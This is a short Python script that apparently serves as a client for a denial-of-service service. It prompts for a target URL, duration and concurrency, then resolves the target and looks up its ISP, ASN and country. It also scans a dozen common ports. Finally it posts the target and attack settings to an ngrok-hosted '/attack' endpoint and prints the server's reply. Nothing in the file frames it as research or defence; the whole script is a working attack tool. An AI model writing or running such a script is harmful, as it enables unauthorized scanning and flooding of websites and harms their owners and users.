import requests
import json
import socket

def get_ip_host(target_url):
    try:
        host = target_url.split("/")[2] if "http" in target_url else target_url
        ip = socket.gethostbyname(host)
        return ip, host
    except:
        return None, None

def get_ipinfo(ip):
    try:
        r = requests.get(f"https://ipinfo.io/{ip}/json")
        return r.json()
    except:
        return {}

def get_ports(ip):
    common_ports = [80, 443, 8080, 8443, 21, 22, 25, 53, 110, 143, 3306, 3389]
    open_ports = []
    for port in common_ports:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.5)
            if s.connect_ex((ip, port)) == 0:
                open_ports.append(port)
            s.close()
        except:
            continue
    return open_ports

def main():
    url = input("Target URL: ").strip()
    duration = int(input("Duration (seconds): "))
    concurrency = int(input("Concurrency: "))

    ip, host = get_ip_host(url)
    info = get_ipinfo(ip) if ip else {}
    ports = get_ports(ip) if ip else []

    print("\n[ INFO TARGET ]")
    print(f"IP WEB     : {ip}")
    print(f"HOST       : {host}")
    print(f"PORT TERBUKA : {', '.join(map(str, ports))}")
    print(f"ISP        : {info.get('org', 'N/A')}")
    print(f"ASN        : {info.get('asn', {}).get('asn', 'N/A') if 'asn' in info else 'N/A'}")
    print(f"COUNTRY    : {info.get('country', 'N/A')}")

    api = "https://mighty-shepherd-externally.ngrok-free.app/attack"
    data = {
        "url": url,
        "duration": duration,
        "concurrency": concurrency
    }

    r = requests.post(api, data=json.dumps(data), headers={"Content-Type": "application/json"})
    print("\n[ RESPONSE SERVER ]")
    print(r.text)

if __name__ == "__main__":
    main()
